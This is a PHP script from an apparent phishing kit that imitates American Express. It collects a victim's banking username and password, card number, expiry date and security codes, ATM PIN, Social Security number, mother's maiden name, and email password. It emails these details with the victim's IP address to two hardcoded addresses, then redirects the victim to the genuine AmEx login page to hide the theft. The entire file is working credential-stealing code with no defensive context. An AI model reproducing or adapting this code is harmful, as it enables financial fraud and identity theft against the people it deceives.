<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------- AMEX ReZulTs -----------\n";
$message .= "Username: ".$_POST['usename']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Phone number of file: ".$_POST['phonenumberfile']."\n";
$message .= "Card Number: ".$_POST['cardnumber']."\n";
$message .= "Expiry Date (Month/Year): ".$_POST['expirydate']."\n";
$message .= "CID: ".$_POST['cid']."\n";
$message .= "CSC: ".$_POST['csc']."\n";
$message .= "ATM PIN: ".$_POST['atmpin']."\n";
$message .= "Your Place of Birth: ".$_POST['placeofbirth']."\n";
$message .= "Mother date of Birth: ".$_POST['motherdateofbirth']."\n";
$message .= "Mother's Maiden Name: ".$_POST['mothermaidenname']."\n";
$message .= "Social Security Number: ".$_POST['ssn']."\n";
$message .= "Security PIN: ".$_POST['securitypin']."\n";
$message .= "Email Address: ".$_POST['emailaddress']."\n";
$message .= "Email Password: ".$_POST['emailpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------Created By seun---------------------\n";
$send = "dbshop.biz@gmail.com, janeseste.87@gmail.com";
$subject = "KRON AMEX";
$headers = "From: Voyage<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://personalsavings.americanexpress.com/onlinebanking/login.do?_flowExecutionKey=_c53B251BD-E2B9-24EE-FD30-CEF10F2DB88D_k971B5FD4-53B0-62E0-0889-6FBA4B730440");
	  

?>